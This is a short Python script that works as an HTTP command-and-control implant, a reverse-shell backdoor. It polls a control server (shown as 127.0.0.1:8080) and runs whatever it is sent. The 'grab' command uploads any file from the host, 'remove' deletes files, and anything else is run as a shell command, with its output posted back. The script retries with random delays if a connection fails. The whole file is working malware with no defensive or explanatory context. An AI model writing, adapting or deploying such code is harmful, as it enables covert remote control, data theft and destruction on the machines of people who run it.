import requests,os,time,random,subprocess


def connect():
    while 1:
        req = requests.get('http://127.0.0.1:8080')
        command = req.text
        if 'terminate' in command:
            return 1
        elif 'grab' in command:
            grab, path = command.split("*")
            if os.path.exists(path):
                url = 'http://127.0.0.1:8080/tmp'
                files = {'file': open(path,'rb')}
                r = requests.post(url, files=files)

            else:
                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to transfer data')
        elif 'remove' in command:
            if len(command)<=5:
                r=requests.post("http://127.0.0.1:8080", data= "also enter the filename")
            else:
                code,filename = command.split(' ') 
                if os.path.exists(filename):
                    os.remove(filename)
                else:
                    r=requests.post("http://127.0.0.1:8080", data= "The file does not exist")

        elif 'cd' in command:
            code,directory = command.split(' ')
            try:
            	os.chdir(directory)
            	r=requests.post("http://127.0.0.1:8080", data= "changes to "+os.getcwd())
            except:
                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to change directory')
        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://127.0.0.1:8080',data=CMD.stderr.read())
            time.sleep(3)

while 1:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1,10)
        time.sleep(int(sleep_for))
        pass
